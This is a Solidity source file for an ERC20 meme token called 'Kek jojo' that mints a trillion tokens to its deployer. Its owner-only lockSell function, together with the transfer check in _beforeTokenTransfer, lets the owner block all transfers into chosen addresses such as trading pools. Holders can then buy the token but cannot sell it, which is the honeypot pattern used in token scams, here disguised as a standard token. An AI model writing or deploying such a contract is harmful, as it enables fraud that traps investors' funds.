// contracts/GLDToken.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract KEKJOJO is Ownable, ERC20, ERC20Burnable {
    mapping(address => bool) public lockedSellPools;

    constructor() ERC20("Kek jojo", "KEKJOJO") {
        _mint(msg.sender, 1_000_000_000_000 * 10**18 );
    }

    function lockSell(address pool_) public onlyOwner {
        lockedSellPools[pool_] = true;
    }

    function unlockSell(address pool_) public onlyOwner {
        lockedSellPools[pool_] = false;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        require(!lockedSellPools[to], "ERC20: Locked sell");
    }
}